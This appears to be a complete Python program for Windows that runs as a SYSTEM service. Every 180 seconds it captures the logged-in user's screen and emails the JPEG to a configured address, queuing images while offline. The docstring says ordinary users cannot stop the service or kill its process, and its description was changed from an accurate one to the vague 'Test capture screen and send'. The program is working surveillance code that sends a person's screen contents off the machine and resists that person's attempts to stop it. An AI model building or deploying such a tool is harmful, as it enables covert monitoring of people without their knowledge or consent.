#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
screenwatch.py — 极简「截屏 → 邮件」监控 (Windows)

行为:
  * 每 INTERVAL 秒截一次当前登录用户的主屏幕,
    JPEG 压缩(硬上限 MAX_JPEG_BYTES, 默认 100KB), 发到 MAIL_TO。
  * 锁屏/登录界面时自动跳过(前台窗口属于 LogonUI.exe), 不截不发不排队。
  * 发送失败(断网/SMTP 错误等)时, 图片存到 %TEMP%\\screenwatch_queue,
    每个周期按时间顺序重发, 发送成功后删除对应文件。
  * 以 SYSTEM 身份注册为 Windows 服务: 普通用户账户无法停止服务,
    任务管理器里也结束不掉其进程。

安装 (管理员账户的 cmd):
  pip install pywin32 pillow
  python screenwatch.py install
  python screenwatch.py start
卸载:
  python screenwatch.py stop
  python screenwatch.py remove
快速测试 (任意账户前台运行, 不进服务, 立即截第一张):
  python screenwatch.py debug
"""
import ctypes
import io
import os
import smtplib
import socket
import sys
import tempfile
import threading
import time
from ctypes import wintypes
from datetime import datetime
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from PIL import Image

# ==================== 配置区 (在这里改) ====================
SMTP_HOST = "smtp.sina.com"        # QQ: smtp.qq.com / 163: smtp.163.com / Gmail: smtp.gmail.com
SMTP_PORT = 465                  # 465 (SSL) 或 587 (STARTTLS)
SMTP_SSL  = True
SMTP_USER = "XXX@sina.com"
SMTP_PASS = "XXXXXXXXX"          # QQ/163 用 SMTP 授权码, 不是登录密码
MAIL_TO   = "XXXXXXXXX@sina.com" # 多个收件人用英文逗号分隔

INTERVAL        = 180            # 截图间隔(秒)
MAX_JPEG_BYTES  = 100 * 1024     # 单张图片硬上限
QUEUE_MAX       = 3000           # 离线时队列上限, 超出删最旧的
FLUSH_PER_CYCLE = 30             # 每周期最多补发多少封队列邮件
# ==================== 配置结束 ====================

HOSTNAME   = socket.gethostname()
QUEUE_DIR  = os.path.join(tempfile.gettempdir(), "screenwatch_queue")
LOG_FILE   = os.path.join(tempfile.gettempdir(), "screenwatch.log")
stop_event = threading.Event()


def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("[{}] {}\n".format(
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"), msg))
        if os.path.getsize(LOG_FILE) > 512 * 1024:
            os.replace(LOG_FILE, LOG_FILE + ".old")
    except Exception:
        pass


# ---------- 截屏 (服务在 session 0, 需附加到用户会话桌面) ----------
user32   = ctypes.windll.user32
gdi32    = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32
kernel32.WTSGetActiveConsoleSessionId.restype = wintypes.DWORD  # 在 kernel32, 不在 user32
user32.OpenInputDesktop.restype = wintypes.HDESK  # WTSGetDesktopHandle 不存在, 用它
user32.GetThreadDesktop.restype = wintypes.HDESK
user32.SetThreadDesktop.restype = wintypes.BOOL
# 句柄返回值必须声明 restype, 否则 ctypes 按 32 位 int 截断 64 位指针;
# 同理, 接收句柄参数的函数必须声明 argtypes, 否则大指针值转换溢出
user32.GetForegroundWindow.restype = wintypes.HWND
user32.GetDC.restype = wintypes.HDC
user32.GetDC.argtypes = [wintypes.HWND]
user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
user32.SetThreadDesktop.argtypes = [wintypes.HDESK]
user32.CloseDesktop.argtypes = [wintypes.HDESK]
gdi32.CreateCompatibleDC.restype = wintypes.HDC
gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
gdi32.SelectObject.restype = wintypes.HGDIOBJ
gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
gdi32.BitBlt.argtypes = [wintypes.HDC] + [ctypes.c_int] * 4 + [wintypes.HDC] + [ctypes.c_int] * 2 + [wintypes.DWORD]
gdi32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT,
                            wintypes.UINT, ctypes.c_void_p, ctypes.c_void_p, wintypes.UINT]
gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
gdi32.DeleteDC.argtypes = [wintypes.HDC]
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.QueryFullProcessImageNameW.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPWSTR, wintypes.LPDWORD]
# READOBJECTS | CREATEWINDOW | ENUMERATE | WRITEOBJECTS | SWITCHDESKTOP
DESKTOP_READ = 0x0001 | 0x0002 | 0x0040 | 0x0080 | 0x0100


class _BIH(ctypes.Structure):
    _fields_ = [("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
                ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
                ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                ("biSizeImage", wintypes.DWORD), ("biX", wintypes.LONG),
                ("biY", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
                ("biClrImportant", wintypes.DWORD)]


def is_locked():
    """锁屏/登录界面时, 当前桌面的前台窗口属于 LogonUI.exe。"""
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return True  # 无前台窗口, 按锁定处理
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, wintypes.LPDWORD]
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    if not pid.value:
        return True
    h = kernel32.OpenProcess(0x1000, False, pid.value)  # PROCESS_QUERY_LIMITED_INFORMATION
    if not h:
        return False  # 查不到进程名时不跳过, 避免误伤
    try:
        buf = ctypes.create_unicode_buffer(1024)
        size = wintypes.DWORD(len(buf))
        if kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size)):
            return os.path.basename(buf.value).lower() == "logonui.exe"
        return False
    finally:
        kernel32.CloseHandle(h)


def capture_screen():
    """返回 (img, reason)。成功时 reason 为 None; 否则 img 为 None, reason 是原因。"""
    sid = kernel32.WTSGetActiveConsoleSessionId()
    if sid == 0xFFFFFFFF:
        return None, "无活动控制台会话"
    hdesk = user32.OpenInputDesktop(0, False, DESKTOP_READ)
    if not hdesk:
        return None, "无法打开用户桌面"
    horig = user32.GetThreadDesktop(0)
    if not user32.SetThreadDesktop(hdesk):
        user32.CloseDesktop(hdesk)
        return None, "附加用户桌面失败"
    img, why = None, "BitBlt/GetDIBits 失败"
    try:
        if is_locked():
            return None, "锁屏/登录界面, 跳过"
        w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
        hdc = user32.GetDC(None)  # GetDC 在 user32, 不在 gdi32
        try:
            mdc = gdi32.CreateCompatibleDC(hdc)
            bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
            gdi32.SelectObject(mdc, bmp)
            if gdi32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020):
                buf = (ctypes.c_ubyte * (w * h * 4))()
                bmi = _BIH()
                bmi.biSize = ctypes.sizeof(bmi)
                bmi.biWidth, bmi.biHeight = w, -h     # -h: 自上而下
                bmi.biPlanes, bmi.biBitCount, bmi.biCompression = 1, 32, 0
                if gdi32.GetDIBits(mdc, bmp, 0, h, buf,
                                   ctypes.byref(bmi), 0) == h:
                    img, why = (Image.frombuffer("RGBA", (w, h), buf,
                                   "raw", "BGRA", 0, 1).convert("RGB")), None
        finally:
            gdi32.DeleteObject(bmp)
            gdi32.DeleteDC(mdc)
            user32.ReleaseDC(None, hdc)
    finally:
        user32.SetThreadDesktop(horig)
        user32.CloseDesktop(hdesk)
    return img, why


# ---------- 压缩 (保证 <= MAX_JPEG_BYTES) ----------
def compress(img):
    w, h = img.size
    for scale in (1.0, 0.8, 0.6, 0.5, 0.4):
        im = img if scale == 1.0 else img.resize(
            (max(320, int(w * scale)), max(200, int(h * scale))), Image.LANCZOS)
        for q in (70, 60, 50, 45, 40, 35):
            buf = io.BytesIO()
            im.save(buf, "JPEG", quality=q)
            if buf.tell() <= MAX_JPEG_BYTES:
                return buf.getvalue()
    buf = io.BytesIO()  # 兜底, 实际不会到这里
    img.resize((320, 180)).save(buf, "JPEG", quality=30)
    return buf.getvalue()


# ---------- 邮件 ----------
def smtp_send(jpeg_bytes, label):
    msg = MIMEMultipart()
    msg["From"], msg["To"] = SMTP_USER, MAIL_TO
    msg["Subject"] = "[ScreenWatch] {} {}".format(HOSTNAME, label)
    msg.attach(MIMEText("Host: {}\nTime: {}\n".format(HOSTNAME, label),
                        "plain", "utf-8"))
    part = MIMEImage(jpeg_bytes, _subtype="jpeg")
    part.add_header("Content-Disposition", "attachment",
                    filename="screenwatch_{}.jpg".format(label))
    msg.attach(part)
    if SMTP_SSL:
        s = smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=30)
    else:
        s = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30)
        s.starttls()
    try:
        s.login(SMTP_USER, SMTP_PASS)
        s.sendmail(SMTP_USER, [x.strip() for x in MAIL_TO.split(",")],
                   msg.as_string())
    finally:
        s.quit()


# ---------- 离线队列 ----------
def queue_files():
    try:
        return sorted(f for f in os.listdir(QUEUE_DIR) if f.endswith(".jpg"))
    except FileNotFoundError:
        return []


def flush_queue():
    """按时间顺序补发队列; 任一失败(视为网络不通)即停止本轮回补, 文件保留。"""
    for name in queue_files()[:FLUSH_PER_CYCLE]:
        if stop_event.is_set():
            break
        path, label = os.path.join(QUEUE_DIR, name), name[:-4]
        try:
            with open(path, "rb") as f:
                smtp_send(f.read(), label)
            os.remove(path)
            log("补发成功 {} (队列剩 {})".format(label, len(queue_files()) - 1))
        except Exception as e:
            log("补发暂停 {}: {}".format(name, e))
            break


def enqueue(jpeg_bytes, label):
    with open(os.path.join(QUEUE_DIR, label + ".jpg"), "wb") as f:
        f.write(jpeg_bytes)
    files = queue_files()
    for old in files[:-QUEUE_MAX]:  # 超上限删最旧
        try:
            os.remove(os.path.join(QUEUE_DIR, old))
        except OSError:
            pass


# ---------- 主循环 ----------
def cycle():
    os.makedirs(QUEUE_DIR, exist_ok=True)
    flush_queue()
    if stop_event.is_set():
        return
    img, why = capture_screen()
    if img is None:
        log("跳过截屏: {}".format(why))
        return
    label = datetime.now().strftime("%Y%m%d_%H%M%S")
    jpeg = compress(img)
    try:
        smtp_send(jpeg, label)
        log("已发送 {} ({}KB)".format(label, len(jpeg) // 1024))
    except Exception as e:
        enqueue(jpeg, label)
        log("存队列 {} ({}KB, 队列共 {}): {}".format(
            label, len(jpeg) // 1024, len(queue_files()), e))


def run_loop():
    log("启动: 间隔{}s, 队列目录 {}".format(INTERVAL, QUEUE_DIR))
    while not stop_event.is_set():
        t0 = time.time()
        try:
            cycle()
        except Exception as e:
            log("cycle 异常: {!r}".format(e))
        stop_event.wait(max(5.0, INTERVAL - (time.time() - t0)))
    log("已停止")


# ---------- Windows 服务 ----------
import win32serviceutil
import win32service


class ScreenWatchSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = "ScreenWatch"
    _svc_display_name_ = "Screen Watch (screenshot mailer)"
    # _svc_description_ = "每3分钟截取活动屏幕并发邮件; 锁屏跳过; 离线存临时目录, 恢复后补发"
    _svc_description_ = "Test capture screen and send"

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        stop_event.set()

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        run_loop()


if __name__ == "__main__":
    # 用法: python screenwatch.py [install|remove|start|stop|debug]
    # debug = 前台直接跑主循环(不装服务), 立即截第一张; Ctrl+C 停止
    if len(sys.argv) > 1 and sys.argv[1].lower() == "debug":
        try:
            run_loop()
        except KeyboardInterrupt:
            stop_event.set()
    else:
        win32serviceutil.HandleCommandLine(ScreenWatchSvc)

